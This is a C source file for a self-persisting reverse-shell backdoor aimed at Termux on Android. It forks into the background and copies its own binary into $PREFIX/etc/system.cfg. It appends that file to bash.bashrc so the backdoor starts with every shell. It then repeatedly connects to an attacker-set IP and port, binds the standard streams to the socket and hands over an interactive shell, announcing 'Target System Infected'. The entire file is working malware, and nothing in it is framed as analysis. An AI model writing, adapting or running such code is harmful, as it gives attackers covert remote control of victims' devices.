#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <sys/types.h>
#include <fcntl.h>

int check_infection(){
    int vfd=open("/data/data/com.termux/files/usr/etc/system.cfg",O_RDONLY);
    if (vfd==-1){
      return 1;
}
    else{
      close(vfd);
      return 0;
}
}


void spawn_in_kernel() {

 int pid=fork();
 if (pid<0){}
 if (pid>0){exit(0);}
  int sid=setsid();
  if (sid<0){}

}

int sfd;
void rcs(){
    struct sockaddr_in ad;
    ad.sin_port=htons(PORT);
    ad.sin_family=AF_INET;
    inet_pton(AF_INET,AIP,&ad.sin_addr.s_addr);
    int cnt;
    sfd=socket(AF_INET,SOCK_STREAM,0);

    while (1){

    cnt=connect(sfd,(struct sockaddr*)&ad,sizeof(ad));
    if (cnt==-1){sleep(15);}
    else        {send(sfd,"[+] Termux Reverse Shell Connected\n",35,0);break;}

}
}

int main(int argc,char*argv[]){

    spawn_in_kernel();  // Rn Reverse Shell In Kernel
    char inject_in_etc[70]="cat ";
    char inject_destination[26]="> $PREFIX/etc/system.cfg";
    strcat(inject_in_etc,argv[0]);
    strcat(inject_in_etc,inject_destination);
    strncat(inject_in_etc,"\0",1);
    if (check_infection()==1){
    system(inject_in_etc);
    system("chmod +x $PREFIX/etc/system.cfg && echo '$PREFIX/etc/system.cfg' >> $PREFIX/etc/bash.bashrc &");
}
    struct sockaddr_in ad;
    ad.sin_port=htons(PORT);
    ad.sin_family=AF_INET;
    inet_pton(AF_INET,AIP,&ad.sin_addr.s_addr);
    rcs();
    close(0);close(1);close(2);
    dup2(sfd,0);dup2(sfd,1);dup2(sfd,2);
    send (sfd,"[+] Target System Infected\n",sizeof("[+] Target System Infected\n"),0);
    while (1){
      system("/data/data/com.termux/files/usr/bin/sh");
      send(sfd,"Press CTRL+C To Exit\n",21,0);
      close(sfd);
      rcs();
      close(0);close(1);close(2);
      dup2(sfd,0);dup2(sfd,1);dup2(sfd,2);
}
}
